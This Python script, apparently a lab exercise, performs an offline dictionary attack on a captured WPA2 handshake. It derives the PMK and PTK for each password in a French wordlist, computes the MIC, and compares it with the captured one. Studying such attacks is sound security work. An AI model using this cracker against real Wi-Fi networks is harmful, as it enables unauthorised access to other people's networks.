from pbkdf2 import *
from wpa_key_derivation import extract_info_from_packet, customPRF512


def compute_mic(passPhrase, ssid, APmac, Clientmac, ANonce, SNonce, data):
    """Computes a MIC from a passphrase and the data from a handshake"""

    # Important parameters for key derivation - most of them can be obtained from the pcap file
    A = "Pairwise key expansion"  # this string is used in the pseudo-random function

    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                                  SNonce)  # used in pseudo-random function

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(passPhrase)
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

    # expand pmk to obtain PTK
    ptk = customPRF512(pmk, str.encode(A), B)

    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16], data, hashlib.sha1)

    return mic.hexdigest()[:-8]


if __name__ == "__main__":

    # De https://raw.githubusercontent.com/Taknok/French-Wordlist/master/francais.txt
    filename = "wordlist.txt"

    with open(filename, "r") as f:
        passwords = f.readlines()


    ssid, APmac, Clientmac, ANonce, SNonce, mic_to_test, eapol, data = extract_info_from_packet()

    # For each password candidate, we compute the MIC and compare it to the one from the handshake
    for password in passwords:
        password = password.strip()
        print("Testing password: {}".format(password))
        if compute_mic(password, ssid, APmac, Clientmac, ANonce, SNonce, data) == mic_to_test:
            print("Password found: {}".format(password))
            break
